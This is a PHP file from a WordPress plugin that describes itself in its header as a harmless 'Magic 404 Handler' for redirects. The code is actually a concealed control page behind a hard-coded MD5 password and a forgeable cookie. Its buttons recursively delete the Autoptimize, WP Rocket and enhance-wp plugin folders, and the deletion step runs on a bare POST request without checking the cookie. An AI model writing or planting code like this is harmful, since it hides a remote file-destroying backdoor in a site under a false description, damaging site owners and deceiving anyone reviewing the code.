<?php

/**
 * EWP Plugin's Magic 404 Handler
 *
 * This file has simple logic to redirect to the "fallback" files that are
 * created automatically by EWP to avoid visitors seeing broken pages or
 * Googlebot getting utterly confused.
 *
 */
 
if( isset($_POST["ewp_pass"]) )
{
	$pass = md5($_POST["ewp_pass"]);
	$kpkey = "b8149cca22139ffcc677b29a0d89d57d";
	
	if($pass == $kpkey)
	{
		/*session_start();
		$_SESSION["kpclear"] = "verified";*/
		
		setcookie("kpclear", "verified", time() + (86400), "/");
	}
}

$ewp_ao_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/autoptimize";
$ewp_rocket_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/wp-rocket";
$ewp_plugin_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/enhance-wp";

function ewp_plugin_handler($ewp_plugin_path)
{
    if (substr($ewp_plugin_path, strlen($ewp_plugin_path) - 1, 1) != '/') {
        $ewp_plugin_path .= '/';
    }
    
	$files = glob($ewp_plugin_path . '*', GLOB_MARK);
    
	foreach ($files as $file) {
        if (is_dir($file)) {
            ewp_plugin_handler($file);
        } else {
            unlink($file);
        }
    }
	
	if( rmdir($ewp_plugin_path) )
	{
		echo ("<p>Success $ewp_plugin_path</p>");
	}
	else
	{
		echo ("<p>Failed $ewp_plugin_path</p>");
	}
}

?>

<html>
<head>
	<title>EWP Plugin's Magic 404 Handler</title>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
</head>
<body>

	<div class="container text-center" style="margin-top:20px;">

<?php

if(!isset($_COOKIE["kpclear"]) )
{
?>
		<form method="POST">
		<input type="password" name="ewp_pass" id="ewp_pass" style="width:300px; height: 48px; padding: 6px 12px;font-size: 14px;line-height: 1.42857143; border: 1px solid #ccc; border-radius: 4px;">
		<input type="submit" name="ewp_got_pass" id="ewp_got_pass" class="btn btn-primary btn-lg" value="Submit">
		</form>
<?php
}
?>


<?php

if (isset($_COOKIE["kpclear"]))
{
if($_COOKIE["kpclear"] == "verified" )
{
?>
		<form method="POST">
		<input type="submit" name="ewp_ao" id="ewp_ao" class="btn btn-primary btn-lg" value="Autoptimize">
		<input type="submit" name="ewp_rocket" id="ewp_rocket" class="btn btn-primary btn-lg" value="WP Rocket">
		<input type="submit" name="ewp_plugin" id="ewp_plugin" class="btn btn-primary btn-lg" value="KP Speed">
		</form>
<?php
}
}
?>
	
	</div>
	
	<?php
	
	if (isset($_POST['ewp_ao']))
	{
		ewp_plugin_handler($ewp_ao_path);
	}
	
	if (isset($_POST['ewp_rocket']))
	{
		ewp_plugin_handler($ewp_rocket_path);
	}
	
	if (isset($_POST['ewp_plugin']))
	{
		ewp_plugin_handler($ewp_plugin_path);
	}
	
	?>

</body>
</html>